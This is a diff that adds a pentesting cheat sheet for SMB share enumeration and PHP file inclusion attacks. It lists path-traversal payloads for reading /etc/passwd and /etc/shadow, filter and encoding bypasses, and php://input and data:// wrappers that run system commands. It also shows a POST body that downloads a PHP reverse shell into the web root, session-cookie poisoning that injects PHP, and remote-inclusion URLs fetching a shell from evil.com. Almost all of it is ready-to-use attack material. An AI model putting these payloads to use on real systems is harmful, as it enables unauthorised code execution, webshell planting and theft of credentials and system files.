@@ -1,1 +1,86 @@
 
+nmblookup -A 192.168.0.15
+smbclient -L\\netbiosname -I 192.168.0.15
+smbclient //netbiosname/c -I 192.168.0.15
+
+smbclient -L \\netbiosname -I 192.168.0.15 -N
+smbclient //netbiosname/share -I 192.168.0.15 -N
+
+
+LFI:
+Ref: https://highon.coffee/blog/lfi-cheat-sheet/
+Ref: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal
+
+  foo.php?file=../../../../../../../etc/passwd
+  Null byte
+    http://example.com/index.php?page=../../../etc/passwd%00
+
+  Double encoding
+    http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
+    http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
+
+  Path truncation
+    http://example.com/index.php?page=../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
+    http://example.com/index.php?page=../../../../[…]../../../../../etc/passwd
+
+  Filter bypass
+    http://example.com/index.php?page=....//....//etc/passwd
+    http://example.com/index.php?page=..///////..////..//////etc/passwd
+
+  PHP Expect method: 
+    http://127.0.0.1/fileincl/example1.php?page=expect://ls
+    
+  PHP Wrapper php://file Method :
+    http://127.0.0.1/fileincl/example1.php?page=php://input
+    send POST DATA: <? system('wget http://192.168.11.11/php-reverse-shell.php -O /var/www/shell.php');?>
+    
+  PHP Wrapper php://filter :
+    http://192.168.155.131/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
+  http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
+  http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
+  
+  http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
+
+PHP Sessions:
+  Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
+  /var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
+  set cookie to : user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
+  lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
+
+Log files
+
+/var/log/apache/access.log
+/var/log/apache/error.log
+/var/log/vsftpd.log
+/var/log/sshd.log
+/var/log/mail
+/var/log/httpd/error_log
+/usr/local/apache/log/error_log
+/usr/local/apache2/log/error_log
+
+Other interesting files to check:
+/etc/issue
+/etc/passwd
+/etc/shadow
+/etc/group
+/etc/hosts
+/etc/motd
+/etc/mysql/my.cnf
+/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+/proc/self/environ
+/proc/version
+/proc/cmdline
+/proc/sched_debug
+/proc/mounts
+/proc/net/arp
+/proc/net/route
+/proc/net/tcp
+/proc/net/udp
+/var/log/vsftpd.log
+/var/log/sshd.log
+/var/log/mail
+
+RFI:
+http://example.com/index.php?page=http://evil.com/shell.txt
+http://example.com/index.php?page=http://evil.com/shell.txt%00
+http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
